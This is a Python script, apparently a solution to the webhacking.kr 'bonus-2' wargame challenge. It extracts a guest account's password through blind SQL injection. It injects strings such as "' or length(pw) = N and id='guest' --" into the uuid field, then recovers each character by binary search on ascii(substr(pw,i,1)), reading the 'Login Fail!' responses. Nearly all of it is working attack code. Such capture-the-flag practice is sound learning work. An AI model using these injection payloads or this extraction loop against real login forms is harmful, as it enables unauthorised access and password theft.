import requests

url = "https://webhacking.kr/challenge/bonus-2/index.php"
datas = {
    'uuid' : '', 
    'pw' : ''   
}



def get_password_length():
    for i in range(30,50):
        injection_string = "' or length(pw) = {} and id='guest' -- ".format(str(i))
        datas['uuid'] = injection_string
        response = requests.post(url,data=datas)
        if('Wrong password' in response.text):
            print("find password length")
            return i

def get_password(password_length):
    password = ''
    for i in range(1,password_length+1):
        left,right = 32,127 
        while(1):
            search = int((left + right)/2)
            #print(search)
            injection_string = "' or id='guest' and ascii(substr(pw,{},1)) < {}--  ".format(i,search)
            datas['uuid'] = injection_string
            response = requests.post(url,data=datas)
            response.text
            # 위의 식이 틀렸다는 말이니까 search를 더 크게 만들어야 한다. left를 바꾼다
            if('Login Fail!' in response.text):
                left = int((left + right)/2)
            else:
                right = int((left + right)/2)
            
            if(left == right):
                print(chr(left))
                password += chr(left)
                break
            if(left == (right -1)):
                injection_string = "' or id='guest' and ascii(substr(pw,{},1)) = {}--  ".format(i,left)
                datas['uuid'] = injection_string
                response = requests.post(url,data=datas)
                if('Login Fail!' in response.text):
                    print(chr(right))
                    password +=chr(right)
                    break
                else:
                    print(chr(left))
                    password +=chr(left)
                    break
    return password


def main():
    password_length = get_password_length()
    password = get_password(password_length)
    print("result : {}".format(password))


if __name__ == '__main__':
    main()


print(get_password_length())